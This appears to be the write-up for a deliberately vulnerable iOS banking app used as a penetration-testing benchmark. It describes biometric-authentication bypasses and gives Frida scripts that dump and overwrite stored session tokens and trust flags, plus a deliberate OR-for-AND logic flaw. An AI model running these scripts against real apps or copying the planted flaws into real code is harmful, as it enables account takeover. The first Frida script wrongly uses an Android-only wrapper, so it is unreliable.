# SecureBank: iOS Biometric Authentication Bypass

## Vulnerability Overview

### Description
This iOS application, SecureBank, is a penetration testing benchmark designed to demonstrate critical vulnerabilities in biometric authentication. The app intentionally implements flawed security controls, allowing attackers to bypass biometric checks through several vectors, including insecure data storage, logic flaws, and weak template management. These vulnerabilities enable unauthorized access to sensitive banking information without valid biometric credentials.

### Vulnerability Type and Category
**Primary Type:** Bypass of Biometric Authentication

**Categories:**
- Improper Authentication (CWE-287)
- Cleartext Storage of Sensitive Information (CWE-312)
- Insecure Storage of Sensitive Information in a Mobile Application (CWE-922)

**Difficulty:** Medium

## Technical Details & Attack Vectors
The application contains multiple, distinct vulnerabilities that can be chained or exploited independently.

### 1. Insecure Authentication Session Storage 🚨
**Location:** ContentView.swift, specifically the storeBiometricTemplate() method.

**Description:** The application stores critical authentication session data, including tokens and device trust flags, as plain text in UserDefaults. This data can be easily read and manipulated by runtime tools, allowing an attacker to replay sessions or falsely establish device trust.

**Vulnerable Data Keys in UserDefaults:**
- `biometric_session_token` // Plain text session identifier for replay attacks
- `biometric_auth_hash` // Replayable authentication hash
- `is_trusted_biometric_device` // Boolean flag to bypass future checks
- `last_successful_auth_time` // Timestamp that can be manipulated
- `authenticated_device_id` // Insecure "trusted device" identifier

### 2. Authentication Logic Bypass 🚨
**Location:** ContentView.swift, within the handleAuthenticationResult() method.

**Description:** A critical logic flaw exists in the authentication result handler. The code uses a logical OR (||) instead of an AND (&&) to check the authentication status. This allows an attacker to gain access when success=false but error=nil (a state achievable by canceling the biometric prompt or having no biometrics enrolled).

**Vulnerable Code:**
```swift
// VULNERABLE: Condition is true when success=false and error=nil
if success || error == nil {
    self.isLoggedIn = true // Access granted!
}
```

### 3. Weak Biometric Template Generation & Injection 🚨
**Location:** BiometricTemplateManager.swift.

**Description:** The application generates predictable biometric "templates" using simple string concatenation instead of secure cryptographic methods. Furthermore, there is no validation, allowing an attacker to inject a malicious or known template to bypass authentication.

## Exploitation Guide

### Phase 1: Reconnaissance (Static Analysis)
Identify vulnerable code patterns and storage locations using simple grep commands.

```bash
# Find biometric logic and LocalAuthentication usage
grep -r "biometric" .
grep -r "LocalAuthentication" .

# Look for insecure storage in UserDefaults
grep -r "UserDefaults.standard" .
grep -r "biometric_session_token" .

# Identify the logic flaw
grep -r "success || error == nil" .
```

### Phase 2: Dynamic Analysis (No Jailbreak Required)
Use runtime tools like Frida or Objection to inspect the application's memory and storage.

**Step 2.1: Dump UserDefaults**
Access UserDefaults to find the insecurely stored session data.

```bash
# Using Objection on a non-jailbroken device
objection -g "SecureBank" explore
ios nsuserdefaults get

# Using Frida on a non-jailbroken device
frida -U -f co.ostorlab.bank -l dump_userdefaults.js
```

**Step 2.2: Extract Session Data with Frida**
This script targets and extracts the specific biometric session keys.

```javascript
// Frida script to extract session data
Java.perform(function() {
    const userDefaults = ObjC.classes.NSUserDefaults.standardUserDefaults();
    const sessionKeys = [
        "biometric_session_token", "biometric_auth_hash",
        "is_trusted_biometric_device", "last_successful_auth_time"
    ];

    console.log("--- Dumping Biometric Session Data ---");
    sessionKeys.forEach(key => {
        const value = userDefaults.objectForKey_(key);
        console.log(`[+] ${key}: ${value}`);
    });
});
```

### Phase 3: Exploitation

**Exploit 1: Authentication Logic Bypass**
1. Ensure no biometric data (Face ID/Touch ID) is enrolled on the device/simulator.
2. Launch the SecureBank app and trigger the biometric authentication prompt.
3. Cancel the prompt.
4. **Result:** The application grants access because the `error == nil` condition is met, successfully bypassing authentication.

**Exploit 2: Session Data Injection & Device Trust Bypass**
Manipulate the insecurely stored data to gain persistent access.

1. Authenticate successfully once to populate UserDefaults with valid session data.
2. Use Frida to overwrite the stored values with malicious data.

```javascript
// Frida script to inject bypass data
var userDefaults = ObjC.classes.NSUserDefaults.standardUserDefaults();

// Set device as trusted to bypass future checks
userDefaults.setBool_forKey_(true, "is_trusted_biometric_device");
userDefaults.setObject_forKey_("attacker_device_id", "authenticated_device_id");

// Inject a predictable hash for future replay
userDefaults.setObject_forKey_("deadbeef", "biometric_auth_hash");

userDefaults.synchronize();
console.log("🚨 Bypass data injected! Relaunch the app.");
```

3. **Result:** Upon relaunch, the app considers the device "trusted" and may grant access without a biometric prompt.

## Detection Indicators

**Static Indicators:** The presence of UserDefaults being used to store any data named `token`, `session`, `hash`, or `trusted`. Logical conditions like `if success || error == nil` in authentication callbacks.

**Dynamic Indicators:** Plain-text authentication data visible in UserDefaults dumps. Successful authentication after canceling the biometric prompt.

**Runtime Indicators:** Console logs revealing template storage locations or session information.

